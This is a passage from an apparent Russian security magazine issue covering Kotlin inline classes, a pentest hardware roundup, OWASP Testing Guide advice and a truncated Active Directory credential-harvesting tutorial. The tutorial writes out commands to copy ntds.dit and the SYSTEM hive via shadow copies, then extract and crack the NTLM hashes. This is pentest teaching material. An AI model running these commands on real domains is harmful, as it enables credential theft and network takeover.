 • не больше одного параметра;
 • никаких теневых полей;
 • никаких блоков инициализации;
 • никакого наследования.

Однако инлайн‐классы могут:
 • реализовать интерфейс;
 • иметь свойства и функции.

Также стоит иметь в виду, что инлайн‐классы не всегда будут разверну ты
в свой параметр. Главное правило здесь: объект инлайн‑клас са не будет
раз вернут, если используется в качес тве аргу мента функции, ожи-
дающей дру гой тип.
  Например, функции для работы с коллекци ями (listOf(), setOf() и им
подобные) обычно принимают на вход параметр типа Object или Any, так что
переданный им объект инлайн‐класса раз вернут не будет. Функция equals()
также принимает в качестве аргу мента тип Any, поэтому сле дующие два при‐
мера работают одинаково, но второй при ведет к дополнительным накладным
расходам:


val doggo1 = DogId(1L)
val doggo2 = DogId(2L)


// Оба объекта будут развернуты
doggo1 == doggo2


// doggo1 будет развернут, а doggo2 — нет
doggo1.equals(doggo2)

Объект не будет развернут и если объект инлайн‐класса передать функции,
аргумент которой имеет nullable‐тип:


val doggo = DogId(1L)


fun pet(doggoId: DogId?) {}


// Объект не будет развернут
pet(doggo)

Интересно также, что компилятор поддерживает переопределение функций,
принимающих объект инлайн‐класса и его необернутый аналог. То есть сле‐
дующий код будет успешно скомпилирован:


fun pet(doggoId: Long) {}
fun pet(doggoId: DogId) {}

Ну и последнее, что сто ит иметь в виду: инлайн‐классы — это эксперимен‐
тальная возможность, которая может измениться со вре менем или будет уда‐
лена.


Композиция про тив наследования в Kotlin
Composition over  inheritance (and  Kotlin) — небольшая заметка, хорошо
иллюстрирующая  принцип  композиции  объектов  и  его  преимущества
перед наследованием.
   Взгляни на сле дующий код:


open class Parent {
    fun parentFunctionality() {}
}


open class Child(): Parent() {
    fun childFunctionality() {}
}


class Grandchild constructor() : Child() {
    fun grandchildFunctionality() {}
}

Это канонический пример нас ледова ния в объектно ориентированном прог‐
раммировании. Объект класса Grandchild смо жет вызывать методы parent‐
Functionality() и childFunctionality(). Код красив и замечателен.
Но представь себе, что будет, если силь но усложнить этот пример, добавив
в каждый класс множество новых открытых методов и свя зав их между собой.
В какой‐то момент может оказать ся, что ты переопределя ешь метод, который
используется другим методом, и таким образом ломаешь функциональность
всего объекта.
  Разумеется, грамотный дизайн поможет избежать этой проблемы, но что,
если команда разработчиков состоит не только из тебя одного и в коде есть
множество классов с незнакомым тебе кодом?
  На самом деле в современном мире наследование уже не считается
единственно верным способом проекти рова ния при ложения. Во многих слу‐
чаях более предпочтительным будет прин цип ком позиции, когда вместо
класса‐наследника соз дается новый класс, который не переопределяет
методы предка, а вызывает их напрямую.
  Предыдущий код, переписанный с использованием принципа композиции,
будет выглядеть так:


class Parent {
    fun parentFunctionality() {}
}


class Child() {
    private val parent = Parent()


    fun parentFunctionality() { parent.parentFunctionality() }
    fun childFunctionality() {}
}


class Grandchild  {
    private val parent = Parent()
    private val child = Child()


    fun parentFunctionality() { parent.parentFunctionality() }
    fun childFunctionality() { child.childFunctionality() }
    fun grandchildFunctionality() {}
}

Принцип композиции не только поз воляет избежать трудно уловимых багов,
но и упрощает тестирование (класс‐предок легко заменить фейковой реали‐
зацией) и сопровождение приложения (код ста новится более очевидным
и понятным).
    Kotlin содержит нес коль ко инстру ментов, которые могут упростить ком‐
позицию классов и даже принудить тебя исполь зовать ее вместо нас ледова‐
ния. Например, именно по причине возможных багов Kotlin делает классы
не наследуемыми по умолчанию. Также здесь есть поддержка синглтонов
на уровне языка, так что многие классы можно быс тро оформить в виде синг‐
лтонов и напрямую вызывать их методы без необ ходимости создавать класс
и хранить на него ссылку.
  Функция‐делегат lazy также помога ет создавать композиции, а точнее
минимизировать возможный оверхед. В следующем коде объ ект parent
будет создан толь ко в момент первого обра щения к нему, то есть не будет
занимать дополнительную память, если вооб ще не используется:


open class Parent {
    fun parentFunctionality() {}
}


open class Child() {
    val parent by lazy { Parent() }
    ...
    fun childFunctionality() {}
}

Ну и последнее — функции‐расширения, которые позволяют добавить новые
методы к существующему клас су без необходимости наследоваться от него:


class SystemClass {
    ...
}


fun SystemClass.newFunctionality() {}


SystemClass().newFunctionality()


             ИНСТРУМЕНТЫ


 • Fuﬂuns — скрипт для быс трого анализа APK‐ и IPA‐файлов;
 • Hook_location_frida.js — скрипт Frida для подделки местоположения.


              БИБЛИОТЕКИ


 • AnimatedBottomBar — анимированная панель навигации в нижней части
   экрана;
 • AndroidColorX — набор функций‐рас ширений Kotlin для работы с цветом;
 • CompoundTextView — TextView, внутри которо го можно произвольно рас‐
   положить изображение;
 • Kotlin‐numpy — биндинги Kotlin для биб лиотеки NumPy;
 • MotionToast — анимированные toast‐сообщения;
 • RoomExplorer — инструмент просмотра баз данных прямо через приложе‐
   ние.
COVERSTORY

  ЧЕМОДАНЧИК
        ХАКЕРА
     2020

                        ВЫБИРАЕМ
                         ИНСТРУМЕНТЫ,
                      КОТОРЫЕ ХОРОШО
                      ИМЕТЬ ПОД РУКОЙ





                                                                         Илья Шапошников
                                                                                           Руководитель
                                                                                    исследовательской группы в
                                                                                 RedTeam, ПАО Ростелеком.
                                                                                     Студент МГТУ им. Баумана.
                                                                                    Капитан команды Invuls и
                                                                                          участник вузовской CTF‐
                                                                                   команды SFT0.
                                                                                            drakylar@gmail.com





Мы отобрали пятнадцать девайсов, с которыми можно пен‐
тестить все что угодно: от физических устройств до бес‐
контактных карт. Сюда не вошли более обыкновенные инс‐
трументы  вроде  отверток  и  паяльников —  их  проще
выбирать  на  свой  вкус.  Надеемся,  ты  присмотришь
что‐нибудь интересное в этом списке.


             INFO

                   В прошлый раз мы делали подборку инструмен‐
                        тов для хакерского чемодан чика в 2014 году.
                  С тех пор многое изме нилось! Смотри также
                         статьи «14 гаджетов для взломщика» и «64 подар‐
                         ка для хакера».



RASPBERRY PI 4
Це на: от 35 долларов
Официальный сайт
  Мини‐компьютеры Raspberry Pi из новейшего модельного ряда работают
на четырехъядерных армовских чипах, осна щаются 1, 2 или 4 Гбайт опе ратив‐
ной памяти, поддерживают связь по Wi‐Fi и Bluetooth и имеют по два порта
micro HDMI и по четыре USB. Они уже почти что могут заменить недорогой
офисный десктоп, часто используются для создания медиацентров и домаш‐
них серверов, а также в мас се разных проектов — от музыкальных инструмен‐
тов до роботов. Но нас интересует другое: Raspberry может стать портатив‐
ной системой для пентестов. А готовых корпусов, дисплеев, батареек и дру‐
гого обвеса для них — великое множес тво. Более подробный об зор Raspber‐
ry Pi 4 мы публиковали в 2019 году, а здесь лишь подтвердим, что «малина» —
это определенно маст‐хэв. Кстати, в ревизии 1.2 решили проблему сов‐
местимости с некоторыми зарядками USB‐C, имей в виду.





PROXMARK 3
Це на: 100–300 евро
Страница на Kickstarter
  Одним из лучших помощ ников для про ведения атак на бесконтактные кар‐
ты было и остается устройство под названием Proxmark3. Оно доступно
в нескольких вариантах.
 1. RDV1 — старая версия устройства, редко встречается на рынке и не имеет
   особых преимуществ.
 2. RDV2 — преимущество этой версии заключается в наличии разъема
   для внешней антенны.
 3. RDV3 — самая популяр ная (и дешевая) модель на рынке, дос тупны китай‐
   ские клоны с теми же функциями, но не всег да ста бильной работой.
 4. RDV4 — последняя версия Proxmark, которая заодно включает в себя тех‐
   ническое и программное обеспечение для работы со смарт‐картами.
  Самая дорогая модель из списка.

Proxmark заменит для тебя все аналогичные устройства, но стоит заметить,
что если ты собираешься изучать только карты Mifare, то лучше посмотреть
в сторону Chameleon Mini.





APIMOTE
Це на: 150 долларов
Официальный сайт
   Если ты успел стол кнуться с умным домом, то наверняка слышал и о про‐
токоле ZigBee. Ему уже мно го лет, но готовых устройств для тес тирования
безопасности сетей не так много. Среди них можно выделить плату APImote,
которая работает в связке с фреймворком killerbee. Устройство поставляется
в готовом виде, но для любителей паять разработчики выложили на GitHub
схемы KiCad.





E-MATE X
Це на: 100 долларов
Официальный сайт
  Набор E‐Mate X будет полезным подарком тем, кто часто работает
со встраиваемыми системами или смартфонами. Состоит он из тринадцати
переходников с чипов энергонеза висимой памяти в корпусе BGA на разные
программаторы и даже на SD‐вход (что поз воля ет в некоторых случаях счи‐
тывать память без программатора). Сто имость аналогов только с одним
из переходников может превышать стоимость E‐Mate X в два раза, а то
и больше.





MAGSPOOF
Це на: 60 долларов
Официальный сайт
  При работе с магнитными картами многие сталкиваются с одной и той же
проблемой: считыватель трехполос ных карт с воз можностью записи порой
стоит в пять раз дороже, чем тот же считыва тель без возможности записи.
Именно для таких задач была разработана плата MagSpoof, на которую мож‐
но записывать данные трех магнитных полос и спуфить их. Тем самым устрой‐
ство заменяет настоящую карту. А в совокупности с ридером магнитных карт
ты сэкономишь половину денег и получишь полноценное устройство для тес‐
тирования безопасности пропус кной или платежной системы.





O.MG CABLE
Це на: 120 долларов
Официальный сайт
   Кабель O.MG стал известен в основном благодаря выс туплению его раз‐
работчиков на DEFCON 2019. В этот кабель зашит пол ноценный Rubber Ducky
с Wi‐Fi, позволяющий уда ленно вводить команды кла виату ры в подключенное
устройство. А глав ный плюс O.MG — его внешность неотличима от обычного
кабеля для зарядки. Есть несколько вариантов: Type‐C, micro‐USB и Lightning.





DSLOGIC
Це на: 60–150 дол ларов
Официальный сайт
  Отлаживать цифровые схемы помогает логический анализатор. А анализа‐
торы серии DSLogic зарекомендовали себя как одни из лучших по соот‐
ношению цены и качества. Более того, в отличие от продукции Saleae, они
поддерживают работу с опенсорсными проекта ми, например с PulseView.
Всего  на  официальном  сайте  дос тупны  три  модели  DSLogic:  Plus,
U3Pro16 и U3Pro32. А если увлекаешься пайкой, то можешь поискать DSLogic
Basic на AliExpress. Эта модель ничем не отличается от DSLogic Plus, кроме
более низкой цены и объема памяти. Кста ти, будет еще допол нительный
челендж, если захочешь сделать апгрейд.





FACEDANCER21
Це на: 85 долларов
Официальный сайт
   Устройство FaceDancer21 — это обязательный инстру мент для тестиров‐
щика платежных терминалов. С его помощью можно проделы вать сле дующие
вещи.
 1. Эмулировать разные USB‐устройства. Можно, например, соз дать устрой‐
   ство с опре деленным ID и обойти список раз решенных подключаемых
   устройств.
 2. Определять, какие типы устройств поддержи вает порт USB. Полезно
   при работе с банкоматами и беспро водными зарядками (в слу чае, если
   беспроводная заряд ка — порт небольшого компьютера).
 3. Фаззить: удобно для поиска 0day в драйверах USB.
 4. Взаимодействовать по USB, используя биб лиотеку на Python.

В связи с тем что плата открытая, цена ее варьируется в зависимости от жад‐
ности производителя.





YARD STICK ONE
Це на: 100 долларов
Официальный сайт
   Если ты пробовал раз блокировать замок своего автомобиля, повторяя
сигнал разблокировки, то, воз можно, оценишь это устройство. Yard Stick One
позволяет отправлять и принимать тра фик на популярных час тотах (до 1 ГГц).
Его отличительная черта — это использование чипа CC1111, который поз воля‐
ет аппаратно демодулировать или модулировать сигнал, что повышает качес‐
тво приема и передачи. Для работы с Yard Stick потребуется установить бес‐
платную утилиту RFCat.





NFC KILL
Це на: 180/250 дол ларов
Официальный сайт
  Немногих сейчас можно удивить устройства ми для тестирования бес‐
контактных карт. Но девайс NFC Kill тебя точно заинтересует: в первую оче‐
редь он предназначен для фаззинг‐тес тирова ния сис тем бесконтактного счи‐
тывания.  А  дополнительные  функции  позволя ют  выводить  из  строя
как ридеры, так и сами бесконтактные карты. Работает девайс на трех час‐
тотах: Low Frequency (125–134 кГц), High Frequency (13,56 МГц) и Ultra High
Frequency (850–930 МГц). Он пос тавляется в двух версиях: Standard и Profes‐
sional. Разница между ними в возможности запускать тесты без физического
взаимодействия с девайсом.





BASH BUNNY
Це на: 100 долларов
Официальный сайт
  Скорее всего, ты уже знаком с Rubber Ducky — устройством, которое эму‐
лирует клавиатуру и на автомате вво дит вредонос ные команды в компьютер
жертвы. Устройство Bash Bunny — это более изощренный вариант девайса
для HID‐атак. Помимо клавиату ры, он может эму лировать любые устройства
для последовательного порта, файловые хранилища и адаптеры USB — Eth‐
ernet. Этот девайс отлично подойдет для проведения тестов Red Team и поз‐
воляет сэкономить деньги и место в походном наборе.





HYDRABUS
Це на: 75 евро
Официальный сайт
   HydraBus изначально раз рабатывался как полноценная замена устарев‐
шей плате BusPirate. Вот список основных достоинств HydraBus:
 • предоставляет пол ноценный пользовательский интерфейс для работы
   с популярными аппа рат ными интерфейсами (I2C, SPI, UART, 1–3‐wire,
   JTAG/SWD);
 • HydraBus можно  использовать  совмес тно  с  PulseView  для  работы
   в режиме логического ана лизатора;
 • есть библиоте ка на Python, что упрощает исполь зование;
 • есть слот MicroSD для сохранения информации по ходу работы.

Стоимость платы составляет 40–75 евро. Дополнительно за 110 евро к ней
можно прикупить модуль HydraNFC для работы с бесконтактными картами
или открытую платку HydraLINCAN для работы с CAN‐шиной.





OPTICSPY
Це на: 65–100 дол ларов
Официальный сайт
   Устройства типа роутеров час то передают мно го ценной информации
при помощи мигающих светодиодов, особенно при включении. Бывает, что
такие светодиоды подключают к линии переда чи данных, например к пину TX
шины UART. Чтобы получать информацию с этого канала передачи данных
без пайки и дорогих логичес ких анализа торов, раз работали платку под наз‐
ванием OpticSpy. Для работы потребуется установить питоновскую библиоте‐
ку, подключить OpticSpy к компь ютеру через USB и под нести его фотодиод
к источнику света. Демо можешь глянуть на YouTube.





HUNTER CAT
Це на: 35 долларов
Официальный сайт
  В 2019 году на рын ке появилось интересное устройство — Hunter Cat. Его
разработали для поиска банковских и дру гих скиммеров. Суть его проста:
вставляешь его в картоприемник, вытас киваешь и смотришь на светодиод.
Если он светится зеленым, то скиммер не обнаружен, в противном слу чае
этим банкоматом лучше не пользовать ся. Размер Hunter Cat чуть больше бан‐
ковской карты, а стоимость — около 35 долларов.





NRF52840 DONGLE
Це на: 18 долларов
Официальный сайт
   Ну и под конец списка — USB‐dongle nRF52840. У него мас са возможнос‐
тей, среди которых стоит выделить две. Во‐первых, ты можешь перепрошить
его и получить пол ноценный сниффер Bluetooth Low Energy с красивым пла‐
гином для Wireshark. Во‐вторых, исполь зуя открытый проект LOGITacker, мож‐
но превратить этот донгл в устройство тестирования беспроводной перифе‐
рии компьютера: мыши, клавиатуры и про чего. Стоимость устрой ства начина‐
ется от 18 долларов, но на AliExpress можно найти китай ские клоны дешевле.
ВЗЛОМ
 ПОКОРЯЕМ
      ВЕБ





                       КАК ПРИМЕНЯТЬ
              OWASP TESTING GUIDE V4
                       В 2020 ГОДУ





                                                                                    v31_v37
                                                                                          v31v37@yandex.ru





Безопас ность веба — очень широкое понятие. Это и недос‐
татки старых протоко лов, и использование каких‐то опасных
вещей,  и  просто  человеческие  ошибки,  допущенные
при разработке софта. Очень непросто тестировать продук‐
ты  в  такой  широкой  области:  нужно  придерживаться
какого‐то плана. И организа ция OWASP облегчила жизнь
специалистам в области ИБ, создав OWASP Testing Guide.


Существует несколь ко методик пентеста, но конкретно для веба создана
только одна. О соот ветс твии стандартам типа PCI DSS сейчас речь не идет,
поскольку  это  узкоспециализированное направление. А мы  поговорим
об универсальной методо логии тес тирова ния. Что предлагает нам OWASP
Testing Guide? Давай про бежимся по этому объ емно му документу и отметим
его части, в которых тебя может ждать больше всего подводных камней.


        WWW

                      Если у тебя не получается освоить английскую
                       версию гайда, воспользуйся краудсорсинговым
                      переводом (правда, он не доделан до конца).
                        Кстати, у OWASP так же есть методика для ревью
                       исходного кода и для тестирования мобильных
                      приложений. А с полным списком проектов ты
                    можешь ознакомиться на owasp.org.


Не так давно в «Хакере» вышла статья, рас крывающая ос новы тестирования
сайтов на безопасность, в ней мельком говорится и о методологии OWASP
и области ее применения. Текущая версия OWASP Testing Guide (PDF) име ет
номер четыре, пятая версия находится в стадии разработки (кстати, ты
можешь делать коммиты в их публичном репозитории на GitHub). Но хоть
руководство по тестированию довольно большое и, на первый взгляд, все‐
объемлющее, его надо воспринимать как основу, а не как рецепт на все слу‐
чаи жизни. В этой статье тебя ждет краткая инс трукция по использованию
OWASP Testing Guide.


НЕ ВСЕ ТО ЗОЛОТО, ЧТО БЛЕСТИТ
Как говорил Эйнштейн, «порядок необ ходим глуп цам, а гений властвует
над хаосом». Но в тестирова нии четкое планирование — это синоним успеха.
Тем не менее план обычно описывает лишь приб лизительную последователь‐
ность действий, даже если он очень детализирован. Предусмотреть все воз‐
можные нюансы зачастую нереально.
  И дело не только в том, что новые технологии появляются с гораздо боль‐
шей скоростью, чем обновляется методика, но и в том, что веб‐при ложе ния
могут использоваться для чего угодно: от создания простого сайта‐визитки
до панели администратора, с помощью которой можно управлять физичес‐
кими устройствами. Поэто му подобные методо логии стоит использовать
только в качестве фундамента и думать своей головой, при этом не забывая
дополнять существующий план практическим опытом.
  Следует использовать все доступные инс трументы. Во‐первых, во время
тестирования по одному раз делу инс трументы могут давать разные резуль‐
таты, а во‐вторых, наложение части разделов на другие поможет закрыть
потенциальные недочеты, ранее не выявленные тестировщиком или авто‐
матическим инструментарием.
   Также может сложиться впечатление, что методика больше пред назначена
для black box тестирования (нес мотря на gray box и white box в самом тексте),
но, в принципе, ее можно распространить на любой вид тестирования,
добавив соответствующие методы и свя занные с ними инструменты.


TESTING GUIDE INTRODUCTION
В начале руководства по тестирова нию от OWASP есть небольшое пре дис‐
ловие, гласящее, что автоматизированное black box тестирование имеет
недостатки и его надо дополнять ручным тестированием. Это так, однако
в самом тексте гайда встречаются примеры исполь зования сканера Nessus,
но нет ни слова про сканер OpenVAS, который, в принципе, не сильно хуже.
  Имеет смысл использовать все имеющиеся сканеры и другие фичи плат‐
ных продуктов (например, Burp Pro), посколь ку разные инстру менты могут
дать разные результаты. Не пренебрегай и ложноположительными срабаты‐
ваниями, поскольку такие результаты иног да внезап но оказываются истинны‐
ми.


TESTING FOR INFORMATION GATHERING
Conduct search engine discovery/reconnaissance for information
leakage
Сбор информации из открытых источников (OSINT) — первый этап любого
пентеста, и пентеста веб‐приложения тоже. Этот этап проводится еще до
начала работ, чтобы проверить, действительно ли тес тируемые объекты при‐
надлежат заказчику, или чтобы оценить примерный объем работ для оценки
трудозатрат.
  В методологии этот этап в основном строится на использовании поис‐
ковых движков (причем раз ных, чтобы скомпенсировать ограничения одного
преимуществами другого). Здесь тебе на помощь придет статья, описыва‐
ющая возможности DuckDuckGo, заметка про операторы поиска и Google
Dorks или материал о скрытых возможностях Google.
   Но, разумеется, OSINT не огра ничивает ся только лишь использованием
поиска, как минимум из‐за наличия неин дексируемых форумов, в том числе
в даркнете, или пер сонализированной выдачи. Поиграть с ней поможет вот
этот сайт. И на любом этапе тестирования не стоит забывать о персонали‐
зированной выдаче самого тестируемо го ресурса. К слову, недавно появился
форк Sherlock’а для поиска по СНГ. Мож но использовать разные техники пас‐
сивного  сбора информа ции,  нап ример  такой  инс трумент,  как  FOCA,
для получения метаданных из документов, которые, скорее всего, присутству‐
ют на тестируемых ресурсах.
  Не стоит забывать про сайты, пря мо или косвенно связанные с IT, а также
тематические  (связанные с тематикой  тес тиру емого объ екта) ресурсы.
В общем, про OSINT мож но говорить дол го, суть в том, что надо исполь‐
зовать руководство по тес тированию как основу, а не как пошаговую инструк‐
цию.


Enumerate applications on webserver
В этом разделе речь идет о раз личных веб‐при ложениях, доступных либо
по секретным субдоменам, либо по относительным путям, к которым имеется
доступ извне. Имеются в виду некие ресурсы сайта, куда может проникнуть
лишь тот, кто знает их URL, по понятным при чинам нигде не афишируемый.
Раздел можно допол нить следующими трю ками:
 • сайты могут быть похожи друг на дру га (например, их делал один под‐
   рядчик). Можно исполь зовать инстру мент для поиска идентичных фраг‐
   ментов кода (коммента рии, раз ные идентифика торы в JS‐библиотеках,
  имена авторов в коммента риях и прочее) наподобие publicwww.com/
   в надежде, что эти сайты были про индексированы;
 • можно  использовать  раз ные  инс трументы  для  поиска  субдоменов
   или  искать  их самому  вручную, используя поиск по сертификатам
   или DNS‐зап росы. Можно использовать свои или об щедоступные словари
   для перебора, ну и в целом привлекать разные инструменты, поскольку
   они постоянно обновля ются и совершенс твуются.


Map execution paths through application
Здесь говорится о составлении «карты» веб‐при ложения, то есть об отоб‐
ражении в текстовом или гра фическом виде всех или почти всех разделов
сайта. Если этот процесс автоматизировать с помощью соответствующих
инструментов, то ты получишь схему веб‐при ложения или сайта, на которую
можно опираться при тес тировании. Например, такая схема поможет клас‐
сифицировать рубрики сайта по раз делам методологии. К тому же автомати‐
зированные утилиты могут обнаружить то, что ты упустил на этапе сбора
информации.


CONFIGURATION AND DEPLOYMENT MANAGEMENT TESTING
В этом разделе описано тестирова ние инфраструктуры веб‐приложения.
В гайде речь идет в основном о веб‐сервере и СУБД. И хоть это фундамент
любого веб‐приложения, не стоит забывать про CI/CD‐системы, шины сооб‐
щений и прочие компоненты инфраструктуры. Конечно, если они входят
в намеченный план работ.


AUTHENTICATION TESTING / AUTHORIZATION TESTING
При  тестировании  аутентификации  и  авториза ции  не  стоит  забывать
про такие вещи, как OAuth, SSO, OpenID. Тебе даже может встретиться аутен‐
тификация по сертификатам.
  В общем, не теряйся, когда на горизонте появит ся что‐то подобное, ведь
схем аутентификации и авторизации су щес твует множество. В один присест
все не изучить, и практика их эксплуата ции на реальных проектах появится
не сразу: главное — понять, к какому разделу тес тирования это относится.


INPUT VALIDATION TESTING
Первые два пункта этого раз дела свя заны с reﬂected/stored XSS‐уязвимос‐
тями. Но XSS‐уязвимости представляют собой подкласс более общих уяз‐
вимостей — reﬂected/stored HTML injection. Может слу читься так, что XSS нет,
а вот HTML  injection  есть. Кста ти, помимо XSS/HTML‐инъекций,  также
не забывай про инъекции в шаб лоны — довольно серьезный подкласс атак,
который может привести к удален ному исполнению кода. Еще один подвид
атаки удаленного исполнения кода — атака SSRF.
   Также не сто ит забывать о том, в каком окружении работает веб‐при ложе‐
ние. Нужно подумать, как потенциальный злоумышленник может исполь‐
зовать это для своей выгоды. Вот при мер утечки хешей с Windows‐сервера
из‐за одной лишь уязвимос ти, свя занной с недос таточно хорошей фильтра‐
цией вводимых данных.
  В этом разделе также говорит ся про бинарные уяз вимости Overﬂow и For‐
mat String: сюда вообще стоит вклю чить весь спектр бинарных уязвимостей
со всевозможными ухищрениями и ата ками, которые можно выпол нить уда‐
ленно. Это тема для отдельной статьи или даже книги и еще одно под‐
тверждение тому, что в области ИБ надо раз вивать ся всесторонне.


BUSINESS LOGIC TESTING
Вообще, в раздел, посвященный тестированию бизнес‐логики, можно вклю‐
чить все что угодно. Проблемы в этой сфере могут привести к возможности
DDOS‐атаки, нарушению целостнос ти, конфиденциальнос ти и доступности
информации. Вариантов можно придумать уйму, тут суть не в том, чтобы пре‐
дусмотреть все возможные, а в том, чтобы научиться дей ствовать по ситу‐
ации. Поэтому раздел носит в основном теоретический характер: практичес‐
кие приемы тестирования зависят от архитек туры и внутренне го устройства
конкретного исследуемо го объекта.


CLIENT SIDE TESTING
В первых двух пунктах этой час ти руководс тва речь снова заходит об XSS‐уяз‐
вимостях, но на стороне клиента. Тут следует обратить вни мание на два
обстоятельства. Во‐первых, не стоит забывать про HTML injection (ее тоже
можно осуществить на стороне клиента). Во‐вторых, XSS‐уязвимости делятся
на четыре типа: server‐side reﬂected, server‐side stored, client‐side reﬂected
и client‐side stored. В последнем случае в качестве хранилища для XSS‐наг‐
рузки используется хранилище бра узера (в пределах сес сии или же на более
долгий срок). На мой взгляд, деление должно быть именно по client‐side re‐
ﬂected и client‐side stored, ибо атаки DOM‐based XSS и arbitrary JS injections
могут быть выполнены в контексте обеих выше упомянутых уяз вимос тей.
   Аналогично родственником атаки SSTI (server side template injection) явля‐
ется CSTI. Принцип ее тот же самый, но выполняется она на стороне клиента.


ЗАКЛЮЧЕНИЕ
Веб‐технологии име ют разные (иногда неочевидные) нюансы, и держать все
это в голове просто невозможно, даже при наличии опыта. Главное ору жие
пентестера — это поисковые системы и свой личный набор инструментов.
  А опыт приходит с практикой. Теоретичес кие же знания можно почерпнуть
в книгах, форумах, статьях, репортах на багбаунти‐площад ках. Можно даже
вести свою собственную базу зна ний — это особенно удобно, если ты
посещаешь кон ференции вроде PHDays, ZeroNights, RuCTF, OﬀensiveCon
или просматриваешь видеолекции. А методология тестирования в каждом
новом проекте — это лишь отправная точка для даль нейшей работы.


        WWW

                      Вот лишь небольшой список ресурсов, с которых
                   можно начать составлять собственную базу зна‐
                         ний:
                        •Блог, посвящен ный пен тестингу и ИБ
                    •База данных веб‐уязвимостей от Acunetix
                    •База уязвимостей, зафик сирован ных Portswig‐
                           ger Burp Scanner
                      •Раздел про веб‐безопасность на DEFCON
                     •Хаб роблог OWASP
                       •Гитхаб GoSecure
                      •Блог Corben Leo
                      •Блог Geekboy
                   •Еще один блог
                      •Блог Detectify Labs
                      •Блог Wallarm
                      •Блог Cisecurity


Стоит гуглить все, что свя зано с безопасностью того компонента, который
используется в веб‐приложении. Например, JWT по отношению к JAVA, Web
Services, если ты встретился с SOAP, или XXE и XSLT, если нужно разобраться
с XML‐документами. Также надо быть готовым к си туациям, не описанным
в методологии, в том числе и к тому, что заказчик захочет протес тировать
свои системы защиты.
  Подходи к процессу творчески: даже очень подробный гайд все равно
не предусмотрит всех воз можных случаев. Дополнительно для сис темати‐
зации собственных зна ний можно изу чить разные классификации угроз
безопасности.
ВЗЛОМ

СБОР УЧЕТОК
В ACTIVE DIRECTORY
КАК ИСКАТЬ
КРИТИЧЕСКИ ВАЖНЫЕ ДАННЫЕ
ПРИ АТАКЕ НА ДОМЕН





        RalfHacker
   hackerralf8@gmail.com





Для успешной атаки на Active Directory, захвата рабочих
станций и перемещения по сети настоящему хакеру не обя‐
зательно  владеть   учетными  данными  поль зователей.
Но иногда без них не обойтись. А что бы завладеть учеткой,
нужно знать, где в сетях с Active Directory обычно хранятся
пароли и как их оттуда добыть.


Дру гие статьи про ата ки на Active Directory
 • Разведка в Active Directory. Получаем пользовательские данные в сетях
   Windows без привилегий
 • Атаки на Active Directory. Раз бира ем акту альные методы повыше ния при‐
   вилегий
 • Боковое перемещение в Active Directory. Раз бираем техники Lateral Move‐
   ment при атаке на домен
 • Защита от детекта в Active Directory. Уклоняемся от обнаружения при атаке
   на домен
 • Защита от детекта в Active Directory. Как обмануть средства обнаруже ния
   при атаке на домен
 • Закрепляемся в Active Directory. Как сохранить дос туп при атаке на домен




           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.



РАБОТА С NTDS.DIT
Файл ntds.dit представляет собой базу данных, в которой хранится
информация Active Directory, такая как сведения о пользователях, группах
и членстве в группах. База также включает хеши паролей для всех поль‐
зователей в домене.
  Первым делом сле дует получить копию фай ла ntds.dit. Он расположен
на контроллере домена в директории C:\Windows\NTDS\. Но прос то ско‐
пировать его не получится, так как этот файл постоянно используется EFS
в  Active  Directory,  и  оператор  (пентестер,  редтимер,  злоумышленник
или исследователь) рискует получить следующее сообщение об ошиб ке.





              Ошибка копирования файла ntds.dit

Я расскажу о двух спо собах скопировать данный файл. Первый способ
использует скрипт PowerShell, а вто рой — копирование с помощью встро‐
енных средств Windows.
   Скрипт  Invoke‐NinjaCopy позволяет копировать любые используемые
службами Windows файлы, в том числе и ntds.dit. При этом скрипт не запус‐
кает посторонних служб и не внедряет ся в процессы или контекст System.
Этот инструмент получает дес криптор диска, что дает ему право на чтение
необработанного массива байтов всего тома. Затем скрипт анализирует
структуру NTFS и ищет определен ную сигнатуру. Таким образом определяет,
где находится файл, и побайтово его копиру ет. Так можно читать даже файлы,
которые блокирует LSASS.





           Копирование файла с помощью Invoke‐NinjaCopy

Плюс ко всему данный скрипт написан на PowerShell, поэтому запускается
из памяти, что позволя ет избежать его сохранения на диск.
   Второй способ — теневое копирование. Для этого используется установ‐
ленный в Windows инструмент vssadmin. Сначала следует создать теневую
копию с помощью сле дующей команды:


> vssadmin create shadow /for=C:





            Создание теневой копии с помощью vssadmin

А теперь можно копировать отту да никем не исполь зуемый файл ntds.dit.


> copy \\?\GLOBALROOT\Device\[имя тома теневой копии]\windows\ntds\
ntds.dit C:\ntds.dit



                       Копирование ntds.dit

Таким образом, файл ntds.dit можно скопировать двумя разными способа‐
ми. Но он зашифрован, и, чтобы его прочитать, необ ходим файл SYSTEM,
получить который можно также несколькими спо собами. К примеру, из той же
теневой копии или из реестра.


> copy \\?\GLOBALROOT\Device\[имя тома теневой копии]\windows\
system32\config\system C:\system


> reg save hklm\system C:\sys



             Копирование файла system из теневой копии



               Получение файла system из реес тра

Теперь у оператора есть необходимые фай лы, и он может перенести их
к себе на машину для дальнейших работ, точнее для извле чения информации
и взлома хешей паролей. Но сначала следует уда лить теневую копию.


> vssadmin delete shadows /shadow=[ID теневой копии]





                      Уда ление теневой копии

Извлечь хеши можно с помощью скрипта secretsdump, входяще го в пакет
impacket.


# secretsdump.py ‐system ./system ‐ntds ./ntds.dit LOCAL





          Использование secretsdump для извлечения хешей

Для взлома NTLM‐хешей можно использовать hashcat. Сохраним их в файл
и отправим на перебор.


hashcat ‐a 0 ‐m 1000 ntlm.hashes dict.txt





                       Файл с хешами





                     Результат работы hashcat

Так мы получим некоторые пароли в открытом виде.


ПОЛУЧЕНИЕ ДАННЫХ АУТЕНТИФИКАЦИИ БЕЗ ВЗАИМОДЕЙСТВИЯ
С LSASS
Конечно, для получения хешей пользовательских паролей можно исполь‐
зовать mimikatz, но сделать это без привлечения процесса LSASS нельзя, так
как mimikatz достает данные непосредственно из памяти этого процесса.
  В системе Windows NetNTLM — это протокол запроса‐ответа, исполь‐
зуемый там, где Kerberos не поддержи вает ся. При обычной атаке опе ратор
может активировать NetNTLMv2 в качес тве клиентской аутентификации,
а затем попробовать пройти проверку подлиннос ти на своем подставном
сервере, чтобы перехватить и проана лизировать запрос от клиента.
  Но использовать сеть — не всегда хорошая идея. Избежать этого нам
поможет SSPI — программный интерфейс в Microsoft Windows между при‐
ложениями и про вайдерами безопасности. Оператор может локально выз‐
вать процедуру метода аутентифика ции NTLM из приложе ния пользователь‐
ского режима через SSPI. Это позволит вычислить ответ NetNTLM в контексте
